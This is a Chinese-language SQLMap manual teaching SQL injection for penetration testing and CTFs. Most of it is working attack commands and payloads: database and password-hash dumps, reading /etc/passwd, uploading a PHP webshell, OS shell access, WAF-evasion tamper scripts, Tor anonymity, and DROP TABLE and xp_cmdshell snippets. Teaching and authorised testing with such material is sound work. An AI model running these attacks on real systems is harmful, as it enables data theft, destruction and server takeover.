# SQLMap 使用手册

## 目录
- [工具简介](#工具简介)
- [安装方法](#安装方法)
- [基本用法](#基本用法)
- [核心参数](#核心参数)
- [实战示例](#实战示例)
- [注入技术](#注入技术)
- [高级功能](#高级功能)
- [输出选项](#输出选项)
- [绕过技巧](#绕过技巧)
- [常见问题](#常见问题)
- [CTF实战](#ctf实战)

---

## 工具简介

**SQLMap** 是一款开源的自动化SQL注入工具，用于检测和利用SQL注入漏洞。

**主要特性**：
- 全自动SQL注入检测
- 支持所有主流数据库（MySQL、PostgreSQL、Oracle、MSSQL等）
- 多种注入技术（基于布尔、基于时间、基于错误、联合查询、堆叠查询）
- 数据库指纹识别
- 数据提取和数据库接管
- 文件系统访问
- 执行系统命令
- WAF识别和绕过

**支持的数据库**：
- MySQL
- Oracle
- PostgreSQL
- Microsoft SQL Server
- Microsoft Access
- IBM DB2
- SQLite
- Firebird
- Sybase
- SAP MaxDB
- HSQLDB
- Informix

**适用场景**：
- Web安全测试
- 渗透测试
- CTF竞赛
- 漏洞挖掘

---

## 安装方法

### 方法1：使用pip安装（推荐）

```bash
# 安装
pip3 install sqlmap

# 验证安装
sqlmap --version
```

### 方法2：从GitHub克隆源码

```bash
# 克隆仓库（推荐，便于更新）
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# 进入目录
cd sqlmap-dev

# 运行
python3 sqlmap.py -u "http://example.com/page.php?id=1"

# 更新
git pull
```

### 方法3：使用包管理器

```bash
# Kali Linux（通常预装）
sudo apt install sqlmap

# Arch Linux
sudo pacman -S sqlmap

# macOS (Homebrew)
brew install sqlmap
```

---

## 基本用法

### 最简单的注入测试

```bash
sqlmap -u "http://example.com/page.php?id=1"
```

### 指定POST数据

```bash
sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"
```

### 从Burp Suite复制的请求

```bash
# 保存Burp请求到request.txt
sqlmap -r request.txt
```

### 批量测试

```bash
# 创建URL列表文件
sqlmap -m urls.txt
```

### 指定数据库类型

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql
```

---

## 核心参数

### 目标设置

| 参数 | 说明 | 示例 |
|------|------|------|
| `-u URL` | 目标URL | `-u "http://site.com/page.php?id=1"` |
| `-d DSN` | 数据库连接字符串 | `-d "mysql://user:pass@host/db"` |
| `-r FILE` | 从文件加载HTTP请求 | `-r request.txt` |
| `-m FILE` | 批量扫描URL列表 | `-m targets.txt` |
| `-g GOOGLE` | 使用Google dork搜索 | `-g "inurl:.php?id="` |

### 请求参数

| 参数 | 说明 | 示例 |
|------|------|------|
| `--method=METHOD` | HTTP方法 | `--method=POST` |
| `--data=DATA` | POST数据 | `--data="id=1&name=test"` |
| `--param-del=CHAR` | 参数分隔符 | `--param-del=";"` |
| `--cookie=COOKIE` | Cookie值 | `--cookie="PHPSESSID=abc123"` |
| `--cookie-del=CHAR` | Cookie分隔符 | `--cookie-del=";"` |
| `--load-cookies=FILE` | 从文件加载Cookie | `--load-cookies=cookies.txt` |
| `--user-agent=UA` | User-Agent | `--user-agent="Mozilla/5.0"` |
| `--random-agent` | 随机User-Agent | `--random-agent` |
| `--host=HOST` | HTTP Host头 | `--host="www.target.com"` |
| `--referer=REFERER` | HTTP Referer头 | `--referer="http://google.com"` |
| `-H HEADER` | 额外的HTTP头 | `-H "X-Forwarded-For: 127.0.0.1"` |
| `--headers=HEADERS` | 多个额外HTTP头 | `--headers="Accept: */*\nConnection: keep-alive"` |

### 注入参数

| 参数 | 说明 | 示例 |
|------|------|------|
| `-p TESTPARAMETER` | 测试指定参数 | `-p id` |
| `--skip=SKIP` | 跳过指定参数 | `--skip="csrf_token"` |
| `--dbms=DBMS` | 指定数据库类型 | `--dbms=mysql` |
| `--os=OS` | 指定操作系统 | `--os=linux` |
| `--level=LEVEL` | 测试等级(1-5) | `--level=3` |
| `--risk=RISK` | 风险等级(1-3) | `--risk=2` |
| `--technique=TECH` | 注入技术 | `--technique=BEUST` |

### 检测参数

| 参数 | 说明 | 示例 |
|------|------|------|
| `--string=STRING` | 页面匹配字符串 | `--string="Welcome"` |
| `--not-string=STRING` | 页面不匹配字符串 | `--not-string="Error"` |
| `--code=CODE` | HTTP响应码 | `--code=200` |
| `--titles` | 比较页面标题 | `--titles` |
| `--text-only` | 仅比较文本内容 | `--text-only` |

### 枚举参数

| 参数 | 说明 | 示例 |
|------|------|------|
| `-b, --banner` | 获取数据库banner | `-b` |
| `--current-user` | 获取当前用户 | `--current-user` |
| `--current-db` | 获取当前数据库 | `--current-db` |
| `--is-dba` | 检测是否DBA | `--is-dba` |
| `--users` | 枚举用户 | `--users` |
| `--passwords` | 枚举密码哈希 | `--passwords` |
| `--privileges` | 枚举权限 | `--privileges` |
| `--roles` | 枚举角色 | `--roles` |
| `--dbs` | 枚举数据库 | `--dbs` |
| `--tables` | 枚举表 | `--tables` |
| `--columns` | 枚举列 | `--columns` |
| `--schema` | 枚举schema | `--schema` |
| `--dump` | 导出数据 | `--dump` |
| `--dump-all` | 导出所有数据库 | `--dump-all` |
| `-D DB` | 指定数据库 | `-D testdb` |
| `-T TABLE` | 指定表 | `-T users` |
| `-C COLUMN` | 指定列 | `-C username,password` |

### 系统文件访问

| 参数 | 说明 | 示例 |
|------|------|------|
| `--file-read=FILE` | 读取文件 | `--file-read="/etc/passwd"` |
| `--file-write=FILE` | 写入本地文件 | `--file-write="shell.php"` |
| `--file-dest=FILE` | 写入目标路径 | `--file-dest="/var/www/html/shell.php"` |

### 操作系统访问

| 参数 | 说明 | 示例 |
|------|------|------|
| `--os-cmd=CMD` | 执行系统命令 | `--os-cmd="whoami"` |
| `--os-shell` | 交互式shell | `--os-shell` |
| `--os-pwn` | OOB shell/Meterpreter | `--os-pwn` |
| `--os-smbrelay` | SMB中继攻击 | `--os-smbrelay` |

### 性能优化

| 参数 | 说明 | 示例 |
|------|------|------|
| `--threads=THREADS` | 最大线程数 | `--threads=10` |
| `--predict-output` | 预测输出 | `--predict-output` |
| `--keep-alive` | 使用持久连接 | `--keep-alive` |
| `--null-connection` | 使用空连接 | `--null-connection` |

### WAF/IPS绕过

| 参数 | 说明 | 示例 |
|------|------|------|
| `--identify-waf` | 识别WAF | `--identify-waf` |
| `--check-waf` | 检查WAF | `--check-waf` |
| `--tamper=TAMPER` | 使用tamper脚本 | `--tamper=space2comment` |
| `--random-agent` | 随机User-Agent | `--random-agent` |
| `--delay=DELAY` | 延迟（秒） | `--delay=2` |

### 输出选项

| 参数 | 说明 | 示例 |
|------|------|------|
| `-v VERBOSE` | 详细级别(0-6) | `-v 3` |
| `--batch` | 使用默认选项 | `--batch` |
| `--flush-session` | 刷新会话 | `--flush-session` |
| `--output-dir=PATH` | 输出目录 | `--output-dir=./results` |
| `-t TRAFFICFILE` | 记录流量 | `-t traffic.txt` |
| `-s SESSIONFILE` | 会话文件 | `-s session.sqlite` |

---

## 实战示例

### 示例1：基础GET注入测试

```bash
# 测试单个参数
sqlmap -u "http://example.com/page.php?id=1"

# 测试所有参数
sqlmap -u "http://example.com/page.php?id=1&name=test"

# 指定测试参数
sqlmap -u "http://example.com/page.php?id=1&name=test" -p id
```

### 示例2：POST注入测试

```bash
# 简单POST注入
sqlmap -u "http://example.com/login.php" \
  --data="username=admin&password=123"

# 指定测试POST参数
sqlmap -u "http://example.com/login.php" \
  --data="username=admin&password=123" \
  -p username
```

### 示例3：使用Burp Suite请求文件

```bash
# 1. 在Burp中右键 -> Copy to file -> 保存为request.txt
# 2. 使用sqlmap测试
sqlmap -r request.txt

# 指定测试参数
sqlmap -r request.txt -p id

# 批量模式（不询问）
sqlmap -r request.txt --batch
```

**request.txt示例**：
```
POST /login.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=123
```

### 示例4：Cookie注入

```bash
# 测试Cookie中的参数
sqlmap -u "http://example.com/page.php" \
  --cookie="id=1; session=abc123" \
  -p id

# 从文件加载Cookie
sqlmap -u "http://example.com/page.php" \
  --load-cookies=cookies.txt
```

### 示例5：枚举数据库信息

```bash
# 获取数据库列表
sqlmap -u "http://example.com/page.php?id=1" --dbs

# 获取当前数据库
sqlmap -u "http://example.com/page.php?id=1" --current-db

# 获取当前用户
sqlmap -u "http://example.com/page.php?id=1" --current-user

# 检查是否DBA
sqlmap -u "http://example.com/page.php?id=1" --is-dba

# 获取所有用户
sqlmap -u "http://example.com/page.php?id=1" --users

# 获取密码哈希
sqlmap -u "http://example.com/page.php?id=1" --passwords
```

### 示例6：枚举表和列

```bash
# 枚举指定数据库的所有表
sqlmap -u "http://example.com/page.php?id=1" -D testdb --tables

# 枚举指定表的所有列
sqlmap -u "http://example.com/page.php?id=1" -D testdb -T users --columns

# 完整枚举
sqlmap -u "http://example.com/page.php?id=1" --schema
```

### 示例7：数据提取

```bash
# 导出指定表的所有数据
sqlmap -u "http://example.com/page.php?id=1" \
  -D testdb -T users --dump

# 导出指定列
sqlmap -u "http://example.com/page.php?id=1" \
  -D testdb -T users -C username,password --dump

# 导出指定条件的数据
sqlmap -u "http://example.com/page.php?id=1" \
  -D testdb -T users --dump --where="id>100"

# 导出所有数据库（慎用）
sqlmap -u "http://example.com/page.php?id=1" --dump-all

# 仅导出数据库结构
sqlmap -u "http://example.com/page.php?id=1" \
  -D testdb --dump --no-data
```

### 示例8：文件读取

```bash
# 读取系统文件
sqlmap -u "http://example.com/page.php?id=1" \
  --file-read="/etc/passwd"

# 读取Web配置文件
sqlmap -u "http://example.com/page.php?id=1" \
  --file-read="/var/www/html/config.php"

# 读取MySQL配置
sqlmap -u "http://example.com/page.php?id=1" \
  --file-read="/etc/my.cnf"
```

### 示例9：文件写入（Webshell）

```bash
# 1. 准备webshell文件 shell.php
# <?php system($_GET['cmd']); ?>

# 2. 上传webshell
sqlmap -u "http://example.com/page.php?id=1" \
  --file-write="shell.php" \
  --file-dest="/var/www/html/shell.php"

# 3. 访问
# http://example.com/shell.php?cmd=whoami
```

### 示例10：系统命令执行

```bash
# 执行单个命令
sqlmap -u "http://example.com/page.php?id=1" \
  --os-cmd="whoami"

# 交互式Shell
sqlmap -u "http://example.com/page.php?id=1" \
  --os-shell

# 在shell中执行：
# > whoami
# > cat /etc/passwd
# > ls -la
```

### 示例11：绕过WAF

```bash
# 使用tamper脚本绕过
sqlmap -u "http://example.com/page.php?id=1" \
  --tamper=space2comment,between

# 多个tamper脚本
sqlmap -u "http://example.com/page.php?id=1" \
  --tamper=space2comment,charencode,randomcase

# 随机User-Agent + 延迟
sqlmap -u "http://example.com/page.php?id=1" \
  --random-agent \
  --delay=2

# 识别WAF
sqlmap -u "http://example.com/page.php?id=1" \
  --identify-waf
```

### 示例12：高级测试

```bash
# 高风险高级别测试
sqlmap -u "http://example.com/page.php?id=1" \
  --level=5 \
  --risk=3

# 指定注入技术
sqlmap -u "http://example.com/page.php?id=1" \
  --technique=U  # 仅联合查询

# 批处理模式 + 详细输出
sqlmap -u "http://example.com/page.php?id=1" \
  --batch \
  -v 3
```

---

## 注入技术

SQLMap支持6种主要注入技术（使用`--technique`参数）：

### B - Boolean-based blind (基于布尔的盲注)

**原理**：通过页面响应的不同判断条件真假

**示例**：
```sql
' AND 1=1 --    # 页面正常
' AND 1=2 --    # 页面异常
```

**使用**：
```bash
sqlmap -u "http://example.com/page.php?id=1" --technique=B
```

### E - Error-based (基于错误)

**原理**：通过数据库错误信息获取数据

**示例**：
```sql
' AND extractvalue(1, concat(0x7e, version())) --
```

**使用**：
```bash
sqlmap -u "http://example.com/page.php?id=1" --technique=E
```

### U - Union query-based (联合查询)

**原理**：使用UNION合并查询结果

**示例**：
```sql
' UNION SELECT 1,2,database(),4 --
```

**使用**：
```bash
sqlmap -u "http://example.com/page.php?id=1" --technique=U
```

### S - Stacked queries (堆叠查询)

**原理**：执行多条SQL语句

**示例**：
```sql
'; DROP TABLE users; --
```

**使用**：
```bash
sqlmap -u "http://example.com/page.php?id=1" --technique=S
```

### T - Time-based blind (基于时间的盲注)

**原理**：通过延迟判断条件真假

**示例**：
```sql
' AND SLEEP(5) --
```

**使用**：
```bash
sqlmap -u "http://example.com/page.php?id=1" --technique=T
```

### Q - Inline queries (内联查询)

**原理**：在查询中嵌入子查询

**使用**：
```bash
sqlmap -u "http://example.com/page.php?id=1" --technique=Q
```

### 组合使用

```bash
# 仅使用联合查询和基于错误
sqlmap -u "http://example.com/page.php?id=1" --technique=UE

# 使用所有技术
sqlmap -u "http://example.com/page.php?id=1" --technique=BEUSTQ
```

---

## 高级功能

### 1. Google Dork搜索

```bash
# 搜索可能存在注入的页面
sqlmap -g "inurl:.php?id="

# 限制结果数量
sqlmap -g "inurl:.php?id=" --crawl=3
```

### 2. 网站爬虫

```bash
# 爬取网站并测试所有链接
sqlmap -u "http://example.com" --crawl=2

# 排除特定URL
sqlmap -u "http://example.com" --crawl=2 --exclude-sysdbs
```

### 3. 表单自动填充

```bash
# 自动识别并测试表单
sqlmap -u "http://example.com/login.php" --forms

# 自动填充表单
sqlmap -u "http://example.com/login.php" --forms --batch
```

### 4. 代理和匿名

```bash
# 使用HTTP代理
sqlmap -u "http://example.com/page.php?id=1" \
  --proxy="http://127.0.0.1:8080"

# 使用SOCKS5代理
sqlmap -u "http://example.com/page.php?id=1" \
  --proxy="socks5://127.0.0.1:1080"

# Tor匿名
sqlmap -u "http://example.com/page.php?id=1" \
  --tor \
  --tor-type=SOCKS5 \
  --tor-port=9050 \
  --check-tor
```

### 5. 会话管理

```bash
# 保存会话
sqlmap -u "http://example.com/page.php?id=1" -s session.sqlite

# 恢复会话
sqlmap -u "http://example.com/page.php?id=1" -s session.sqlite

# 刷新会话（重新测试）
sqlmap -u "http://example.com/page.php?id=1" --flush-session
```

### 6. 自定义注入点

```bash
# 使用星号(*)标记注入点
sqlmap -u "http://example.com/page.php" \
  --data="id=1*&name=test"

# URI中的注入点
sqlmap -u "http://example.com/page/1*"

# 多个注入点
sqlmap -u "http://example.com/page.php?id=1*&cat=2*"
```

---

## 输出选项

### 详细级别

```bash
# 0 - 仅显示Python错误和关键消息
sqlmap -u URL -v 0

# 1 - 显示基本信息（默认）
sqlmap -u URL -v 1

# 2 - 显示调试信息
sqlmap -u URL -v 2

# 3 - 显示payload
sqlmap -u URL -v 3

# 4 - 显示HTTP请求
sqlmap -u URL -v 4

# 5 - 显示HTTP响应头
sqlmap -u URL -v 5

# 6 - 显示HTTP响应内容
sqlmap -u URL -v 6
```

### 输出目录

```bash
# 指定输出目录
sqlmap -u URL --output-dir=/tmp/sqlmap_results

# 默认目录：
# ~/.sqlmap/output/
```

### 流量记录

```bash
# 记录所有HTTP流量
sqlmap -u URL -t traffic.txt

# 查看流量文件
cat traffic.txt
```

---

## 绕过技巧

### 常用Tamper脚本

| Tamper脚本 | 功能 | 示例 |
|------------|------|------|
| `space2comment` | 空格替换为注释 | `SELECT` → `SELECT/**/` |
| `space2plus` | 空格替换为加号 | `SELECT` → `SELECT+FROM` |
| `space2hash` | 空格替换为#号和换行 | `SELECT` → `SELECT%0A#%0A` |
| `between` | 用BETWEEN替换> | `>` → `NOT BETWEEN 0 AND #` |
| `charencode` | URL编码 | `SELECT` → `%53%45%4C%45%43%54` |
| `randomcase` | 随机大小写 | `SELECT` → `SeLeCt` |
| `charunicodeencode` | Unicode编码 | `SELECT` → `%u0053%u0045%u004C%u0045%u0043%u0054` |
| `equaltolike` | 等号替换为LIKE | `=` → `LIKE` |
| `greatest` | 用GREATEST替换> | `>` → `GREATEST` |
| `apostrophenullencode` | 单引号替换 | `'` → `%00%27` |
| `appendnullbyte` | 添加NULL字节 | `SELECT` → `SELECT%00` |
| `ifnull2ifisnull` | IFNULL替换 | `IFNULL(A,B)` → `IF(ISNULL(A),B,A)` |
| `modsecurityversioned` | 绕过ModSecurity | `SELECT` → `/*!SELECT*/` |
| `modsecurityzeroversioned` | 绕过ModSecurity | `SELECT` → `/*!00000SELECT*/` |
| `versionedkeywords` | 版本注释 | `SELECT` → `/*!50000SELECT*/` |

### 绕过示例

```bash
# 绕过空格过滤
sqlmap -u URL --tamper=space2comment

# 绕过关键字过滤
sqlmap -u URL --tamper=randomcase,charencode

# 绕过WAF（ModSecurity）
sqlmap -u URL --tamper=modsecurityversioned,space2comment

# 绕过安全狗
sqlmap -u URL --tamper=space2comment,between

# 组合多个tamper
sqlmap -u URL --tamper=space2comment,between,randomcase,charencode

# 自定义tamper脚本位置
# ~/.sqlmap/tamper/
```

### 自定义Tamper脚本

创建 `custom.py`：

```python
#!/usr/bin/env python

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    自定义payload修改
    """
    # 示例：替换SELECT为ＳＥＬＥＣＴ（全角字符）
    return payload.replace("SELECT", "ＳＥＬＥＣＴ")
```

使用：
```bash
sqlmap -u URL --tamper=custom
```

---

## 常见问题

### Q1: 如何加快扫描速度？

**解决方案**：
```bash
# 增加线程
sqlmap -u URL --threads=10

# 使用预测输出
sqlmap -u URL --predict-output

# 使用空连接
sqlmap -u URL --null-connection

# 组合使用
sqlmap -u URL --threads=10 --predict-output --null-connection
```

### Q2: 如何处理防护措施？

**解决方案**：
```bash
# 识别WAF
sqlmap -u URL --identify-waf

# 使用tamper脚本
sqlmap -u URL --tamper=space2comment,between

# 降低速度避免检测
sqlmap -u URL --delay=2 --randomize=param

# 随机User-Agent
sqlmap -u URL --random-agent
```

### Q3: 如何测试登录后的页面？

**解决方案**：
```bash
# 方法1：使用Cookie
sqlmap -u URL --cookie="session=abc123"

# 方法2：从浏览器导出Cookie
# Chrome: EditThisCookie插件导出
sqlmap -u URL --load-cookies=cookies.txt

# 方法3：使用Burp请求文件
sqlmap -r request.txt
```

### Q4: HTTPS站点出现SSL错误？

**解决方案**：
```bash
# 忽略SSL错误
sqlmap -u "https://example.com/page.php?id=1" --force-ssl
```

### Q5: 如何保存和恢复扫描进度？

**解决方案**：
```bash
# 保存会话
sqlmap -u URL -s session.sqlite

# 恢复会话
sqlmap -u URL -s session.sqlite --resume

# 查看会话目录
ls ~/.sqlmap/output/
```

### Q6: 如何批量扫描不询问？

**解决方案**：
```bash
# 使用batch模式
sqlmap -u URL --batch

# 组合其他参数
sqlmap -u URL --batch --threads=10 -v 0
```

### Q7: 误报太多怎么办？

**解决方案**：
```bash
# 降低风险级别
sqlmap -u URL --level=1 --risk=1

# 指定特定注入技术
sqlmap -u URL --technique=E  # 仅基于错误

# 使用字符串匹配
sqlmap -u URL --string="Welcome"
```

---

## CTF实战

### CTF常见场景

#### 1. 简单GET注入

```bash
# 基础测试
sqlmap -u "http://ctf.example.com/page.php?id=1" --batch

# 快速获取数据库
sqlmap -u "http://ctf.example.com/page.php?id=1" --current-db --batch

# 获取表
sqlmap -u "http://ctf.example.com/page.php?id=1" -D ctf_db --tables --batch

# 获取flag
sqlmap -u "http://ctf.example.com/page.php?id=1" -D ctf_db -T flag --dump --batch
```

#### 2. POST注入

```bash
# 登录表单注入
sqlmap -u "http://ctf.example.com/login.php" \
  --data="username=admin&password=123" \
  -p username \
  --batch

# 搜索框注入
sqlmap -u "http://ctf.example.com/search.php" \
  --data="keyword=test" \
  --batch
```

#### 3. Cookie注入

```bash
# 测试Cookie中的id参数
sqlmap -u "http://ctf.example.com/profile.php" \
  --cookie="id=1; session=abc" \
  -p id \
  --batch
```

#### 4. JSON注入

```bash
# 保存请求到request.txt
# POST /api/user HTTP/1.1
# Content-Type: application/json
#
# {"id": "1", "name": "test"}

sqlmap -r request.txt --batch
```

#### 5. 盲注优化

```bash
# 基于时间的盲注（较慢）
sqlmap -u "http://ctf.example.com/page.php?id=1" \
  --technique=T \
  --threads=10 \
  --batch

# 基于布尔的盲注（较快）
sqlmap -u "http://ctf.example.com/page.php?id=1" \
  --technique=B \
  --batch
```

#### 6. 文件读取获取flag

```bash
# 读取flag文件
sqlmap -u "http://ctf.example.com/page.php?id=1" \
  --file-read="/var/www/html/flag.txt" \
  --batch

# 读取配置文件
sqlmap -u "http://ctf.example.com/page.php?id=1" \
  --file-read="/var/www/html/config.php" \
  --batch
```

#### 7. 二次注入

```bash
# 第一步：注册用户（插入payload）
# username: admin'--

# 第二步：登录后测试
sqlmap -u "http://ctf.example.com/profile.php" \
  --cookie="session=abc123" \
  --second-order="http://ctf.example.com/info.php" \
  --batch
```

### CTF快速流程

```bash
# 1. 快速检测是否存在注入
sqlmap -u "TARGET_URL" --batch --smart

# 2. 如果存在，获取当前数据库
sqlmap -u "TARGET_URL" --current-db --batch

# 3. 列出所有表
sqlmap -u "TARGET_URL" -D DATABASE_NAME --tables --batch

# 4. 如果看到flag表，直接dump
sqlmap -u "TARGET_URL" -D DATABASE_NAME -T flag --dump --batch

# 5. 如果没有flag表，dump所有数据
sqlmap -u "TARGET_URL" -D DATABASE_NAME --dump-all --batch
```

### CTF技巧

```bash
# 技巧1：使用--smart智能检测
sqlmap -u URL --smart --batch

# 技巧2：跳过系统数据库
sqlmap -u URL --exclude-sysdbs

# 技巧3：搜索包含关键字的列
sqlmap -u URL -D db --search -C flag,password,secret

# 技巧4：限制dump数量（快速查看）
sqlmap -u URL -D db -T users --dump --start=1 --stop=10

# 技巧5：只dump特定列
sqlmap -u URL -D db -T flag -C flag_value --dump

# 技巧6：使用where条件
sqlmap -u URL -D db -T users --dump --where="id>100"
```

### 完整CTF示例

```bash
# 场景：某CTF题目URL为 http://ctf.example.com/article.php?id=1

# 步骤1：快速检测
sqlmap -u "http://ctf.example.com/article.php?id=1" --batch

# 步骤2：获取数据库列表
sqlmap -u "http://ctf.example.com/article.php?id=1" --dbs --batch

# 输出：
# [*] ctf
# [*] information_schema
# [*] mysql

# 步骤3：查看ctf数据库的表
sqlmap -u "http://ctf.example.com/article.php?id=1" -D ctf --tables --batch

# 输出：
# [*] articles
# [*] users
# [*] secret_flag

# 步骤4：dump flag表
sqlmap -u "http://ctf.example.com/article.php?id=1" -D ctf -T secret_flag --dump --batch

# 输出：
# +----+--------------------------------+
# | id | flag                           |
# +----+--------------------------------+
# | 1  | flag{sql_injection_is_easy}   |
# +----+--------------------------------+

# 获得flag: flag{sql_injection_is_easy}
```

---

## 安全提示

⚠️ **重要提醒**：

1. **仅用于授权测试**：只能在获得明确授权的系统上使用
2. **遵守法律法规**：未经授权的SQL注入测试是违法行为
3. **教育用途**：本手册仅供安全教育和CTF竞赛使用
4. **数据保护**：测试过程中注意保护敏感数据
5. **影响评估**：某些操作（如--os-shell）可能对目标系统造成影响
6. **CTF环境**：在CTF环境中可以大胆尝试，但生产环境需谨慎

---

## 参考资源

- **官方网站**: https://sqlmap.org
- **GitHub**: https://github.com/sqlmapproject/sqlmap
- **Wiki文档**: https://github.com/sqlmapproject/sqlmap/wiki
- **Tamper脚本**: https://github.com/sqlmapproject/sqlmap/tree/master/tamper
- **OWASP**: https://owasp.org/www-community/attacks/SQL_Injection

---

## 快速参考卡

### 最常用命令

```bash
# 基础测试
sqlmap -u "URL" --batch

# POST注入
sqlmap -u "URL" --data="param=value" --batch

# Cookie注入
sqlmap -u "URL" --cookie="id=1" -p id --batch

# 使用请求文件
sqlmap -r request.txt --batch

# 完整枚举流程
sqlmap -u "URL" --dbs --batch                    # 列数据库
sqlmap -u "URL" -D db_name --tables --batch      # 列表
sqlmap -u "URL" -D db_name -T table --dump --batch  # dump数据

# 文件操作
sqlmap -u "URL" --file-read="/etc/passwd" --batch

# WAF绕过
sqlmap -u "URL" --tamper=space2comment --random-agent --batch

# 高级测试
sqlmap -u "URL" --level=5 --risk=3 --batch
```

### 推荐参数组合

```bash
# CTF快速模式
sqlmap -u "URL" --batch --smart --threads=10 -v 0

# 渗透测试标准模式
sqlmap -u "URL" --batch --random-agent --tamper=space2comment

# 深度测试模式
sqlmap -u "URL" --level=5 --risk=3 --batch --threads=10

# 隐蔽模式
sqlmap -u "URL" --random-agent --delay=2 --tor --batch
```

---

**文档版本**: 1.0
**更新日期**: 2025-01-21
**适用版本**: SQLMap 1.9+

---

## 附录：常见数据库特性

### MySQL

```sql
-- 版本
SELECT @@version
SELECT version()

-- 当前用户
SELECT user()
SELECT current_user()

-- 当前数据库
SELECT database()

-- 文件读取
SELECT load_file('/etc/passwd')

-- 文件写入
SELECT 'shell' INTO OUTFILE '/var/www/html/shell.php'

-- 延时
SELECT SLEEP(5)
```

### PostgreSQL

```sql
-- 版本
SELECT version()

-- 当前用户
SELECT current_user

-- 当前数据库
SELECT current_database()

-- 文件读取
SELECT pg_read_file('/etc/passwd')

-- 命令执行
COPY (SELECT '') TO PROGRAM 'whoami'
```

### MSSQL

```sql
-- 版本
SELECT @@version

-- 当前用户
SELECT SUSER_NAME()
SELECT USER_NAME()

-- 当前数据库
SELECT DB_NAME()

-- 延时
WAITFOR DELAY '00:00:05'

-- 命令执行
EXEC xp_cmdshell 'whoami'
```

### Oracle

```sql
-- 版本
SELECT banner FROM v$version

-- 当前用户
SELECT user FROM dual

-- 延时
BEGIN DBMS_LOCK.SLEEP(5); END;
```
